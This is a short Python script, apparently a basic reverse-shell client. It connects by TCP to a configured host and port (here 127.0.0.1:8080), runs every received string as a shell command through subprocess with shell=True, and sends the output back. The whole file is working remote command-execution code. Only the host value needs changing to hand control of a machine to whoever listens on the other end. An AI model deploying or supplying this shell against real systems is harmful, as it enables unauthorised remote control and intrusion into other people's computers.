#!/usr/bin/python3

import socket
import subprocess

host = '127.0.0.1'
port = 8080

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

while True:
    comm = client.recv(1024).decode()
    if not comm:
        break
    elif comm == '':
        pass
    else:
        output = subprocess.check_output(comm, stderr=subprocess.STDOUT, text=True, shell=True)
        client.send(output.encode())

client.close()
